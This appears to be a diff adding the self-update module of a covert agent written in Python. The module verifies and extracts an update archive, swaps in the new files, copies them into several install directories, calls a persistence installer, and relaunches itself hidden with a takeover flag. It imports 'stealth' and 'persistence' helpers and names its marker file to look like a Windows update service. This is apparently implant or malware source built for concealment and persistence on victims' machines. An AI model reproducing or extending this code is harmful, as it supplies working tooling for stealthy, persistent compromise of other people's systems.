@@ -1,0 +1,211 @@
+"""Self-update from a zip produced by :mod:`syspy.packaging`.
+
+The flow is deliberately conservative:
+
+1. verify the SHA-256 of the whole archive
+2. extract into a staging directory
+3. verify the per-file manifest
+4. byte-compile every module
+5. swap in the new tree, keeping ``.bak`` copies
+6. start a fresh process and wait for its boot marker
+7. roll back automatically if it does not report in
+"""
+
+from __future__ import annotations
+
+import compileall
+import hashlib
+import io
+import os
+import shutil
+import subprocess
+import sys
+import tempfile
+import time
+import zipfile
+
+from .. import packaging
+from . import persistence, runtime, stealth
+
+IS_WINDOWS = os.name == "nt"
+CREATE_NEW_PROCESS_GROUP = 0x00000200 if IS_WINDOWS else 0
+BOOT_MARK = os.path.join(tempfile.gettempdir(), "windowsupdateservice.boot")
+
+
+def _sha256(data: bytes) -> str:
+    return hashlib.sha256(data).hexdigest()
+
+
+def _file_sha256(path: str) -> str:
+    try:
+        with open(path, "rb") as handle:
+            return _sha256(handle.read())
+    except OSError:
+        return ""
+
+
+def _remove(path: str) -> None:
+    """Remove a file *or* directory.  ``rmtree`` on a file silently no-ops."""
+    if os.path.islink(path):
+        try:
+            os.remove(path)
+        except OSError:
+            pass
+    elif os.path.isdir(path):
+        shutil.rmtree(path, ignore_errors=True)
+    elif os.path.exists(path):
+        try:
+            os.remove(path)
+        except OSError:
+            pass
+
+
+def write_boot_marker() -> None:
+    """Called by a freshly started agent so its parent knows it survived."""
+    entry = os.path.join(stealth.bundle_root(), "agent.py")
+    try:
+        with open(BOOT_MARK, "w", encoding="ascii") as handle:
+            handle.write(f"{os.getpid()}:{_file_sha256(entry)}")
+    except OSError:
+        pass
+
+
+def apply(archive: bytes, expected_sha: str = "", restart: bool = True) -> tuple[bool, str]:
+    """Apply an update archive.  Returns ``(ok, message)``."""
+    digest = _sha256(archive)
+    if expected_sha and digest != expected_sha:
+        return False, "archive hash mismatch"
+    if len(archive) < 256:
+        return False, "archive suspiciously small"
+
+    staging = os.path.join(stealth.primary_directory(), ".staging")
+    _remove(staging)
+    os.makedirs(staging, exist_ok=True)
+
+    try:
+        with zipfile.ZipFile(io.BytesIO(archive)) as bundle:
+            bundle.extractall(staging)
+    except zipfile.BadZipFile:
+        return False, "not a valid zip archive"
+
+    ok, reason = packaging.verify_manifest(staging)
+    if not ok:
+        return False, reason
+
+    if not compileall.compile_dir(staging, quiet=2, force=True):
+        return False, "compilation failed"
+
+    root = stealth.bundle_root()
+    try:
+        _swap(staging, root)
+    except OSError as error:
+        return False, f"swap failed: {error}"
+
+    persistence.install_copies()
+
+    if restart:
+        restart_self()
+    return True, digest[:12]
+
+
+def _swap(staging: str, root: str) -> None:
+    """Replace the live bundle with the staged one, keeping backups."""
+    exec_name = stealth.executable_name()
+    bundle_items = ["syspy", "agent.py"]
+    if exec_name and exec_name not in bundle_items:
+        bundle_items.append(exec_name)
+
+    for relative in bundle_items:
+        live = os.path.join(root, relative)
+        fresh = os.path.join(staging, relative)
+        if not os.path.exists(fresh) and relative == exec_name:
+            fresh = os.path.join(staging, "agent.py")
+        if not os.path.exists(fresh):
+            continue
+        _remove(live + ".bak")
+        if os.path.exists(live):
+            try:
+                shutil.copytree(live, live + ".bak", dirs_exist_ok=True) if os.path.isdir(live) else shutil.copy2(live, live + ".bak")
+            except OSError:
+                pass
+        try:
+            if os.path.isdir(fresh):
+                shutil.copytree(fresh, live, dirs_exist_ok=True,
+                                ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
+            else:
+                shutil.copy2(fresh, live)
+        except OSError:
+            shutil.move(fresh, live)
+
+    for directory in stealth.install_directories():
+        if os.path.abspath(directory) == os.path.abspath(root):
+            continue
+        for relative in bundle_items:
+            source = os.path.join(root, relative)
+            if not os.path.exists(source) and relative == exec_name:
+                source = os.path.join(root, "agent.py")
+            if not os.path.exists(source):
+                continue
+            target = os.path.join(directory, relative)
+            _remove(target)
+            if os.path.isdir(source):
+                shutil.copytree(source, target, dirs_exist_ok=True,
+                                ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
+            else:
+                shutil.copy2(source, target)
+
+
+def rollback() -> int:
+    """Restore ``.bak`` copies.  Returns how many items were restored."""
+    root = stealth.bundle_root()
+    restored = 0
+    for relative in ("syspy", "agent.py"):
+        backup = os.path.join(root, relative + ".bak")
+        live = os.path.join(root, relative)
+        if not os.path.exists(backup):
+            continue
+        _remove(live)
+        shutil.move(backup, live)
+        restored += 1
+    return restored
+
+
+def restart_self(path: str | None = None) -> None:
+    """Launch a fresh copy, wait for it to report in, roll back on failure."""
+    root = stealth.bundle_root()
+    target = path or os.path.join(root, os.path.basename(sys.argv[0]))
+    if not os.path.exists(target):
+        target = os.path.join(root, "agent.py")
+
+    _remove(BOOT_MARK)
+
+    command = [target] if target.lower().endswith(".exe") else [runtime.interpreter(), target]
+    command += ["--takeover", str(os.getpid()), "--hidden"]
+
+    for attempt in range(3):
+        try:
+            process = subprocess.Popen(command, cwd=root, close_fds=True,
+                                       creationflags=CREATE_NEW_PROCESS_GROUP)
+        except OSError:
+            os.execv(runtime.interpreter(),
+                     [runtime.interpreter(), target, "--takeover", str(os.getpid())])
+            return
+
+        deadline = time.time() + 12
+        while time.time() < deadline:
+            time.sleep(0.25)
+            if os.path.exists(BOOT_MARK):
+                try:
+                    with open(BOOT_MARK, "r", encoding="ascii") as handle:
+                        if handle.read().startswith(str(process.pid)):
+                            os._exit(0)
+                except OSError:
+                    pass
+            if process.poll() is not None:
+                break
+
+        if attempt < 2 and rollback():
+            continue
+        break
+
+    os._exit(0)
